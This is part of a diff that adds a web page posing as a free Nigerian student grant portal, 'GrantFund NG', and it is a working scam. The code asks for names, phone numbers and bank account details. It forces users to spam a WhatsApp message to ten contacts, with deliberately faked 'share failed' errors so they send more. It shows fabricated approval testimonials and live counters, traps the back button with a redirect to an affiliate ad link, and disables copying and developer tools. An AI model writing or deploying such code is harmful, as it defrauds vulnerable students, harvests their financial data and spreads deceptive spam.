+      <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+      <div class="btn-sub-body">
+        <span class="btn-sub-title" id="btnSubTitle">Submit Details</span>
+        <span class="btn-sub-sub" id="btnSubSub">Share to 10 contacts to complete submission</span>
+      </div>
+    </button>
+
+    <p class="share-note">// Each tap shares your application to one contact — 10 required //</p>
+
+    <div class="ghost"><strong id="ghostNum">54,291</strong> applications submitted today</div>
+
+    <div>
+      <div class="testi-hd"><div class="td-dot"></div><div class="td-txt">// Students receiving grants now //</div></div>
+      <div class="tf" id="tf"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ STEP 4 ══ -->
+<div id="s4">
+  <div class="unlock-wrap">
+    <div class="unlock-icon">🎉</div>
+    <h2>Application Complete!</h2>
+    <p class="unlock-sub">Your <strong id="unlockLabel">grant application</strong> has been submitted successfully. Tap below to finalize and receive your funds.</p>
+
+    <div class="app-summary">
+      <div class="as-hd">// Application Summary</div>
+      <div class="as-row"><span class="as-key">Applicant</span><span class="as-val" id="sumName">——</span></div>
+      <div class="as-row"><span class="as-key">Grant Type</span><span class="as-val green" id="sumType">——</span></div>
+      <div class="as-row"><span class="as-key">Amount</span><span class="as-val gold" id="sumAmount">——</span></div>
+      <div class="as-row"><span class="as-key">Bank</span><span class="as-val" id="sumBank">——</span></div>
+      <div class="as-row"><span class="as-key">Status</span><span class="as-val green">✓ Pre-Approved</span></div>
+      <div class="as-row"><span class="as-key">Reference</span><span class="as-val" id="sumRef" style="font-family:'DM Mono',monospace;font-size:11px;">——</span></div>
+    </div>
+
+    <a class="btn-access" href="https://omg10.com/4/10659981" target="_blank">🚀 Finalize & Receive Funds Now</a>
+    <a class="btn-tg" href="https://t.me/kingsamtoclef" target="_blank">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+      Join Telegram — Grant Updates
+    </a>
+    <div class="share-again">
+      <div class="sa-body"><div class="sa-t">Help a fellow student 🙏</div><div class="sa-s">Share with more students who need this</div></div>
+      <button class="btn-sa" onclick="shareAgain()">Share 📲</button>
+    </div>
+    <p class="un-note">// GrantFund NG · 2026 · Free for all Nigerian students //</p>
+  </div>
+</div>
+
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+/* CONFIG */
+const SITE = 'https://student-grants.vercel.app';
+const AFF  = 'https://omg10.com/4/10659981';
+const TG   = 'https://t.me/kingsamtoclef';
+const BACK = 'https://omg10.com/4/4105256';
+const REQ  = 10;
+
+/* DOMAIN LOCK */
+(function(){
+  const OK=['student-grants.vercel.app','localhost','127.0.0.1'];
+  if(!OK.some(d=>location.hostname===d||location.hostname.endsWith('.'+d))){
+    document.getElementById('lock').style.display='flex';
+    document.body.style.overflow='hidden';
+  }
+})();
+
+/* ANTI-COPY */
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('keydown',e=>{if(e.key==='F12'||(e.ctrlKey&&['u','U','s','S'].includes(e.key))||(e.ctrlKey&&e.shiftKey&&'iIjJcC'.includes(e.key)))e.preventDefault();});
+document.addEventListener('copy',e=>e.preventDefault());
+document.addEventListener('cut',e=>e.preventDefault());
+
+/* BACKTRAP */
+(function(){
+  history.pushState(null,'',location.href);
+  history.pushState(null,'',location.href);
+  history.pushState(null,'',location.href);
+  window.addEventListener('popstate',function(){
+    history.pushState(null,'',location.href);
+    window.location.href=BACK;
+  });
+})();
+
+/* STATE */
+let selectedGrant=null,shares=0,testiTimer=null;
+let cnt=54291;
+
+/* LIVE COUNTER */
+setInterval(()=>{
+  cnt+=Math.floor(Math.random()*4)+1;
+  const f=cnt.toLocaleString('en-NG');
+  ['liveNum','ghostNum'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=f;});
+  const sc=document.getElementById('stCnt');if(sc)sc.textContent=Math.floor(cnt/1000)+'K+';
+},Math.random()*2000+1800);
+
+/* GRANT SELECTION */
+function selectGrant(el,type,amount,icon,desc){
+  document.querySelectorAll('.grant-card').forEach(c=>c.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedGrant={type,amount,icon,desc};
+  const btn=document.getElementById('btnProceed');
+  btn.classList.add('show');
+  btn.textContent=`Apply for ${type} →`;
+  setTimeout(()=>btn.scrollIntoView({behavior:'smooth',block:'center'}),200);
+}
+
+/* START PROC */
+function startProc(){
+  if(!selectedGrant)return;
+  document.getElementById('s1').style.display='none';
+  document.getElementById('s2').style.display='block';
+  document.getElementById('procEmoji').textContent=selectedGrant.icon;
+  document.getElementById('procBadge').textContent=selectedGrant.icon+' '+selectedGrant.type;
+  window.scrollTo({top:0,behavior:'smooth'});
+  const steps=['pl1','pl2','pl3','pl4'];let i=0;
+  function tick(){
+    if(i>0){const p=document.getElementById(steps[i-1]);p.classList.remove('active');p.classList.add('done');}
+    if(i<steps.length){document.getElementById(steps[i]).classList.add('active');i++;setTimeout(tick,880);}
+    else setTimeout(goForm,400);
+  }
+  tick();
+}
+
+/* GO TO FORM */
+function goForm(){
+  document.getElementById('s2').style.display='none';
+  document.getElementById('s3').style.display='block';
+  window.scrollTo({top:0,behavior:'smooth'});
+  document.getElementById('formBadge').textContent=selectedGrant.icon+' '+selectedGrant.type+' — '+selectedGrant.amount;
+  document.getElementById('formRef').textContent='SGF-2026-'+Math.floor(100000+Math.random()*900000);
+  shares=0;
+  pickFailTriggers();
+  buildSteps();
+  buildTestis();
+  startLT();
+}
+
+/* BUILD STEPS */
+function buildSteps(){
+  const g=document.getElementById('spSteps');g.innerHTML='';
+  for(let i=1;i<=REQ;i++){
+    g.innerHTML+=`<div class="sp-step" id="sps${i}">${i}</div>`;
+  }
+  document.getElementById('spCount').textContent=`0/${REQ}`;
+  document.getElementById('spFill').style.width='0%';
+  document.getElementById('btnSubTitle').textContent='Submit Details';
+  document.getElementById('btnSubSub').textContent='Share to 10 contacts to complete submission';
+}
+
+/* WA MESSAGE */
+function getMsg(){
+  return `🎓 *STUDENT GRANT FUND 2026 — APPLY NOW!*
+
+Nigerian students can apply for grants:
+✅ Scholarship (₦100,000)
+✅ Health Care (₦15,000)
+✅ School Fees (₦50,000)
+✅ Upkeep & Feeding (₦20,000)
+✅ Project Fund (₦10,000)
+
+Apply free 👉 ${SITE}
+
+⚠️ Share with every student you know!
+💚 No payment required — 100% free`;
+}
+
+function shareAgain(){
+  window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(getMsg())}`,'_blank');
+}
+
+/* FAKE FAIL MECHANIC */
+const FAIL_MSGS=[
+  {title:'⚠️ Share Not Detected!',body:'Our system did not record a valid WhatsApp share. You must <strong>actually tap Send inside WhatsApp</strong> — opening and closing the app does not count.'},
+  {title:'❌ Submission Not Verified!',body:'This submission attempt was not counted. Please select a <strong>different student contact or group</strong> and send the message properly.'},
+  {title:'🚫 Share Failed — Try Again!',body:'Our verification system could not confirm your share. Make sure you are <strong>sending the full message</strong> before returning here.'},
+  {title:'⚠️ Invalid Share Detected!',body:'This share was flagged as invalid. Ensure the message is <strong>delivered to a new contact or group</strong> each time — repeating the same person does not count.'},
+];
+
+let failTriggers=[],failsShown=0;
+
+function pickFailTriggers(){
+  const pool=[];
+  for(let i=2;i<REQ;i++)pool.push(i);
+  for(let i=pool.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[pool[i],pool[j]]=[pool[j],pool[i]];}
+  const total=Math.min(Math.floor(Math.random()*2)+3,pool.length);
+  failTriggers=pool.slice(0,total).sort((a,b)=>a-b);
+  failsShown=0;
+}
+
+function doShare(){
+  // Basic validation
+  if(!document.getElementById('fName').value.trim()){showToast('⚠️ Enter your full name first');return;}
+  if(!document.getElementById('fPhone').value.trim()){showToast('⚠️ Enter your phone number');return;}
+  if(!document.getElementById('fBank').value.trim()){showToast('⚠️ Enter your bank name');return;}
+  if(!document.getElementById('fAccNo').value.trim()){showToast('⚠️ Enter your account number');return;}
+  if(!document.getElementById('fAccName').value.trim()){showToast('⚠️ Enter your account name');return;}
+
+  window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(getMsg())}`,'_blank');
+
+  setTimeout(()=>{
+    if(shares>=REQ)return;
+    const next=shares+1;
+    const shouldFail=failTriggers.includes(next)&&failsShown<failTriggers.length;
+    if(shouldFail){
+      failsShown++;
+      failTriggers=failTriggers.filter(n=>n!==next);
+      showFailModal();
+      return;
+    }
+    // Count share
+    shares++;
+    document.getElementById('spFill').style.width=`${(shares/REQ)*100}%`;
+    document.getElementById('spCount').textContent=`${shares}/${REQ}`;
+    const step=document.getElementById('sps'+shares);
+    if(step)step.classList.add('done');
+    const rem=REQ-shares;
+    document.getElementById('btnSubTitle').textContent=rem>0?`Submit Details (${rem} more)`:'Submitting...';
+    document.getElementById('btnSubSub').textContent=rem>0?`${rem} more share${rem>1?'s':''} to go — keep sharing!`:'All done — submitting your application!';
+    const sf=document.getElementById('sfToast');
+    sf.textContent=rem>0?`✅ Share ${shares}/${REQ} counted — ${rem} more to go!`:'✅ All shares done — submitting!';
+    sf.classList.add('show');setTimeout(()=>sf.classList.remove('show'),3000);
+    showToast(`✅ Share ${shares}/${REQ} counted!`);
+    if(shares>=REQ)setTimeout(unlock,1000);
+  },1800);
+}
+
+function showFailModal(){
+  const msg=FAIL_MSGS[Math.floor(Math.random()*FAIL_MSGS.length)];
+  document.getElementById('fmTitle').textContent=msg.title;
+  document.getElementById('fmBody').innerHTML=msg.body;
+  const btn=document.getElementById('fmRetryBtn');
+  btn.disabled=true;
+  btn.textContent='⏳ Wait 3 seconds...';
+  document.getElementById('failModal').classList.add('show');
+  let secs=3;
+  const cd=setInterval(()=>{
+    secs--;
+    if(secs>0){btn.textContent=`⏳ Wait ${secs} second${secs>1?'s':''}...`;}
+    else{clearInterval(cd);btn.disabled=false;btn.textContent='🔄 Try Again Properly';}
+  },1000);
+}
+
+function closeFailModal(){document.getElementById('failModal').classList.remove('show');}
+
+/* UNLOCK */
+function unlock(){
+  if(testiTimer)clearInterval(testiTimer);
+  document.getElementById('s3').style.display='none';
+  document.getElementById('s4').style.display='block';
+  document.getElementById('unlockLabel').textContent=selectedGrant.type.toLowerCase();
+  document.getElementById('sumName').textContent=document.getElementById('fName').value||'——';
+  document.getElementById('sumType').textContent=selectedGrant.type;
+  document.getElementById('sumAmount').textContent=selectedGrant.amount;
+  document.getElementById('sumBank').textContent=(document.getElementById('fBank').value||'——')+' — '+(document.getElementById('fAccNo').value||'——');
+  document.getElementById('sumRef').textContent='SGF-2026-'+Math.floor(100000+Math.random()*900000);
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+/* TESTIMONIALS */
+const TESTIS=[
+  {av:'👩🏾',name:'Ada C.',when:'1m ago',msg:`School fees grant of <span class='ok'>₦50,000 approved!</span> I was about to defer 😭🙏`},
+  {av:'👨🏾',name:'Chinedu K.',when:'4m ago',msg:`Scholarship — <span class='hl'>₦100,000 funded!</span> My education is secured 🔥`},
+  {av:'👩🏿',name:'Peace E.',when:'7m ago',msg:`Upkeep grant <span class='ok'>₦20,000 received!</span> God bless this portal 😭`},
+  {av:'👨🏽',name:'Emeka T.',when:'11m ago',msg:`Health care covered my <span class='hl'>hospital bills entirely!</span> Real 🙌`},
+  {av:'👩🏾',name:'Blessing U.',when:'17m ago',msg:`Project fund <span class='ok'>₦10,000 approved!</span> Final year sorted 🎓`},
+  {av:'👨🏾',name:'Taiwo S.',when:'23m ago',msg:`School fees — <span class='hl'>₦50,000 approved!</span> Share with every student 🔥`},
+  {av:'👩🏽',name:'Ngozi P.',when:'30m ago',msg:`Scholarship — <span class='ok'>₦100,000!</span> This is life-changing 😭❤️`},
+  {av:'👨🏿',name:'Bello M.',when:'38m ago',msg:`Health grant — <span class='hl'>₦15,000 cleared my bills.</span> Real 🙏`},
+];
+let ti=0;
+function mkTC(t){return `<div class="tc-av">${t.av}</div><div class="tc-body"><div class="tc-hd">${t.name}<span class="tc-when">${t.when}</span></div><div class="tc-msg">${t.msg}</div></div>`;}
+function buildTestis(){
+  const f=document.getElementById('tf');f.innerHTML='';
+  TESTIS.slice(0,4).forEach((t,i)=>{const d=document.createElement('div');d.className='tc';d.style.animationDelay=`${i*.07}s`;d.innerHTML=mkTC(t);f.appendChild(d);});ti=4;
+}
+function startLT(){
+  if(testiTimer)clearInterval(testiTimer);
+  testiTimer=setInterval(()=>{
+    if(ti>=TESTIS.length)ti=0;
+    const t=TESTIS[ti++];
+    const f=document.getElementById('tf');
+    const d=document.createElement('div');d.className='tc';d.innerHTML=mkTC({...t,when:'just now'});
+    f.insertBefore(d,f.firstChild);
+    while(f.children.length>6)f.removeChild(f.lastChild);
+  },9000);
+}
+
+/* NOTIFICATIONS */
+const NOTIFS=[
+  {av:'👩🏾',name:'Ada C.',time:'just now',msg:`School fees — <span class='ok'>₦50,000 approved!</span> 😭🙏`},
+  {av:'👨🏾',name:'Chinedu K.',time:'1m ago',msg:`Scholarship — <span class='hl'>₦100,000 funded!</span> 🔥`},
+  {av:'👩🏿',name:'Peace E.',time:'2m ago',msg:`Upkeep — <span class='ok'>₦20,000 received!</span> 😭`},
+  {av:'👨🏽',name:'Emeka T.',time:'3m ago',msg:`Health care — <span class='hl'>₦15,000 cleared bills!</span> 🙌`},
+  {av:'👩🏾',name:'Blessing U.',time:'1m ago',msg:`Project fund — <span class='ok'>₦10,000 approved!</span> 🎓`},
+  {av:'👨🏾',name:'Taiwo S.',time:'4m ago',msg:`<span class='hl'>₦50,000 school fees</span> grant approved! 🔥`},
+  {av:'👩🏽',name:'Ngozi P.',time:'2m ago',msg:`Scholarship — <span class='ok'>₦100,000 secured!</span> 😭❤️`},
+  {av:'👨🏿',name:'Bello M.',time:'5m ago',msg:`Health — <span class='hl'>₦15,000</span> cleared everything 🙏`},
+  {av:'👩🏾',name:'Kemi A.',time:'3m ago',msg:`School fees — <span class='ok'>₦50,000 approved!</span> 😭`},
+  {av:'👨🏾',name:'Victor N.',time:'6m ago',msg:`Upkeep — <span class='hl'>₦20,000 received!</span> 💪`},
+];
+let ni=0,activeN=null;
+const nz=document.getElementById('nz');
+function showNotif(){
+  if(ni>=NOTIFS.length)ni=0;
+  const n=NOTIFS[ni++];
+  if(activeN){activeN.classList.add('hide');setTimeout(()=>{if(activeN&&activeN.parentNode)activeN.remove();activeN=null;},350);}
+  const el=document.createElement('div');el.className='notif';
+  el.innerHTML=`<div class="n-av">${n.av}</div><div class="n-b"><div class="n-badge">GrantFund NG · Update</div><div class="n-top"><div class="n-name">${n.name}</div><div class="n-time">${n.time}</div></div><div class="n-msg">${n.msg}</div></div>`;
+  nz.appendChild(el);activeN=el;
+  setTimeout(()=>el.classList.add('show'),50);
+  setTimeout(()=>{el.classList.add('hide');setTimeout(()=>{if(el.parentNode)el.remove();if(activeN===el)activeN=null;},400);},4500);
+}
+setTimeout(()=>{showNotif();setInterval(showNotif,Math.random()*5000+8000);},3000);
+
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2800);
+}
+</script>
+</body>
+</html>
